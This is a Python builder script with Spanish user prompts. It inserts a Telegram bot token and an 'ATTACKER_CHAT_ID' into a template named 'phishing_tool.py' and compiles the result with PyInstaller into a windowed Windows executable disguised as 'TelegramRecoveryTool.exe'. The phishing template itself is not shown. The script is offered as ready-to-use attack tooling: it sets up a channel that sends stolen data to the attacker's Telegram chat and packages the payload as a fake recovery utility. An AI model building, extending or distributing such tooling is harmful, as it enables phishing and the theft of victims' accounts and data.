import os
import sys
import subprocess

def configure_and_build():
    """
    Guides the user through configuring the script and then offers
    to build a Windows executable using PyInstaller.
    """
    print("=============================================")
    print("  Herramienta de Configuración y Compilación ")
    print("=============================================")
    print("Este script te ayudará a configurar tus credenciales y a")
    print("compilar la herramienta en un ejecutable (.exe).")

    # --- Step 1: Configuration ---
    bot_token = input("\n[+] Introduce el TOKEN de tu bot de Telegram: ").strip()
    chat_id = input("[+] Introduce tu CHAT_ID de Telegram: ").strip()

    if not bot_token or not chat_id:
        print("\n[!] Error: Ambos, el BOT_TOKEN y el CHAT_ID, son obligatorios.")
        sys.exit(1)

    try:
        with open("phishing_tool.py", "r", encoding="utf-8") as f:
            template_content = f.read()
    except FileNotFoundError:
        print("\n[!] Error: No se encontró 'phishing_tool.py'. Asegúrate de que ambos scripts están en el mismo directorio.")
        sys.exit(1)

    configured_content = template_content.replace(
        'BOT_TOKEN = "PON_AQUÍ_EL_TOKEN_DE_TU_BOT"',
        f'BOT_TOKEN = "{bot_token}"'
    )
    configured_content = configured_content.replace(
        'ATTACKER_CHAT_ID = "PON_AQUÍ_TU_CHAT_ID"',
        f'ATTACKER_CHAT_ID = "{chat_id}"'
    )

    output_filename = "phishing_tool_configured.py"
    with open(output_filename, "w", encoding="utf-8") as f:
        f.write(configured_content)

    print(f"\n[SUCCESS] ¡Configuración completada!")
    print(f"El archivo listo para usar ha sido guardado como: {output_filename}")

    # --- Step 2: Build Executable ---
    print("\n---------------------------------------------")
    compile_choice = input("[?] ¿Deseas compilar el script en un archivo .exe ahora? (s/n): ").strip().lower()

    if compile_choice == 's':
        print("\n[*] Iniciando el proceso de compilación con PyInstaller...")

        executable_name = "TelegramRecoveryTool"
        icon_path = "icon.ico"

        command = [
            "pyinstaller",
            "--onefile",
            "--windowed", # Crucial para aplicaciones GUI
            f"--name={executable_name}",
            output_filename
        ]

        if os.path.exists(icon_path):
            print(f"[*] Icono '{icon_path}' encontrado. Se incluirá en el ejecutable.")
            command.append(f"--icon={icon_path}")
        else:
            print("[*] Advertencia: No se encontró 'icon.ico'. El ejecutable no tendrá un icono personalizado.")
            print("   (Puedes crear o descargar un archivo .ico y ponerlo en esta carpeta para un mejor resultado).")

        try:
            subprocess.run(command, check=True, capture_output=True, text=True)
            print(f"\n[SUCCESS] ¡Compilación completada!")
            print(f"El archivo ejecutable '{executable_name}.exe' se encuentra en la carpeta 'dist'.")
        except FileNotFoundError:
             print("\n[!] Error: No se encontró el comando 'pyinstaller'.")
             print("    Asegúrate de haberlo instalado con: pip install pyinstaller")
             sys.exit(1)
        except subprocess.CalledProcessError as e:
            print("\n[!] Error durante la compilación. Aquí está la salida de PyInstaller:")
            print("------------------------- ERROR LOG -------------------------")
            print(e.stdout)
            print(e.stderr)
            print("-------------------------------------------------------------")
            sys.exit(1)
        except Exception as e:
            print(f"\n[!] Ha ocurrido un error inesperado durante la compilación: {e}")
            sys.exit(1)
    else:
        print("\n[*] Proceso de compilación omitido. Puedes compilarlo manualmente más tarde.")

if __name__ == "__main__":
    configure_and_build()